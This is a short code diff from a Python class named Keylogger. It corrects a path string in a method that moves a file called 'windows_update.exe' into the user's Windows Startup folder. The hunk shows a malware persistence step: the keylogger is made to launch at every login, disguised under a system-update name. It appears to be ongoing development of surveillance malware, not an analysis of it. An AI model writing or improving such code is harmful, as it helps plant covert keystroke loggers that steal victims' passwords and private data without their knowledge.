@@ -33,7 +33,7 @@ class Keylogger:
 
     def change_dir(self, username):
         username = getpass.getuser()
-        path = f'C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
+        path = fr'C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
         shutil.move("windows_update.exe", path)
 
 
